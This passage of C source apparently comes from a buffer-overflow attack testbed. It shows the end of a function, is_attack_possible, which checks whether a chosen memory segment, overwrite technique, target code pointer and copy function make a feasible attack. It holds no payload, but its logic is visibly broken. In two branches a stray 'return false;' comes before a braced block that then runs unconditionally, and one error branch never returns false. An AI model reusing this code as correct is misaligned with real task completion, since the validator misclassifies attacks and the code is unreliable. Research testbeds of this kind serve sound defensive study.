                    print_reason("Error: Impossible to perform a direct attack on the stack into another memory segment.\n");
                } else if ((attack.code_ptr == FUNC_PTR_STACK_PARAM) &&
                  ((attack.function == STRCAT) ||
                  (attack.function == SNPRINTF) ||
                  (attack.function == SSCANF) ||
                  (attack.function == HOMEBREW)))
                    return false;
                {
                    print_reason("Error: Impossible to attack the stack parameter directly with the following functions: strcat(), snprintf(), sscanf(), homebrew_memcpy()\n");
                    return false;
                }
            }
            break;

        case HEAP:
            if ((attack.technique == DIRECT) &&
              ((attack.code_ptr == RET_ADDR) ||
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (attack.code_ptr == FUNC_PTR_BSS) ||
              (attack.code_ptr == FUNC_PTR_DATA) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (attack.code_ptr == LONGJMP_BUF_BSS) ||
              (attack.code_ptr == LONGJMP_BUF_DATA) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_BSS) ))
            {
                print_reason("Error: Impossible to perform a direct attack on the heap into another memory segment.\n");
                return false;
            }
            break;

        case DATA:
            if ((attack.technique == DIRECT) &&
              ((attack.code_ptr == RET_ADDR) ||
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (attack.code_ptr == FUNC_PTR_BSS) ||
              (attack.code_ptr == FUNC_PTR_HEAP) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (attack.code_ptr == LONGJMP_BUF_HEAP) ||
              (attack.code_ptr == LONGJMP_BUF_BSS) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_BSS) ))
            {
                print_reason("Error: Impossible to perform a direct attack on the data segment into another memory segment.\n");
                return false;
            }
            break;

        case BSS:
            if ((attack.technique == DIRECT) &&
              ((attack.code_ptr == RET_ADDR) ||
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (attack.code_ptr == FUNC_PTR_DATA) ||
              (attack.code_ptr == FUNC_PTR_HEAP) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (attack.code_ptr == LONGJMP_BUF_HEAP) ||
              (attack.code_ptr == LONGJMP_BUF_DATA) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
              (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ))
            {
                print_reason("Error: Impossible to perform a direct attack on the bss into another memory segment.\n");
            } else if ((attack.technique == INDIRECT) &&
              (attack.code_ptr == LONGJMP_BUF_HEAP) &&
              (!(attack.function == MEMCPY) &&
              !(attack.function == STRNCPY) &&
              !(attack.function == HOMEBREW)))
                return false;
            {
                print_reason("Error: Impossible to perform BSS->Heap Longjmp attacks using string functions.\n");
                return false;
            }
            break;
    }

    return true;
} /* is_attack_possible */
